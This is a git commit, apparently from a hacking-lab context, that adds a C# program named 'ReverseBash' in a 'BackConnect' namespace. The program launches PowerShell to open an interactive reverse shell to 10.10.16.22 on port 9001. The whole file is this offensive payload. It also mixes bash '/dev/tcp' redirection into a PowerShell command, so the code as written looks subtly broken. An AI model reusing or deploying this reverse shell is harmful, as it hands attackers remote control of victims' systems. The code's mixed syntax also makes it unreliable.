89910067b1eb27e30b24ca116953db4ab9b827e1
ハッカー <90001235+fake-420@users.noreply.github.com>
2023-10-05 00:58:26 +0530

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,19 @@
+﻿using System;
+using System.Diagnostics;
+
+namespace BackConnect {
+  class ReverseBash {
+	public static void Main(string[] args) {
+	  Process proc = new System.Diagnostics.Process();
+	  proc.StartInfo.FileName = "powershell";
+	  proc.StartInfo.Arguments = "-c \"powershell -i >& /dev/tcp/10.10.16.22/9001 0>&1\"";
+	  proc.StartInfo.UseShellExecute = false;
+	  proc.StartInfo.RedirectStandardOutput = true;
+	  proc.Start();
+
+	  while (!proc.StandardOutput.EndOfStream) {
+		Console.WriteLine(proc.StandardOutput.ReadLine());
+	  }
+	}
+  }
+}
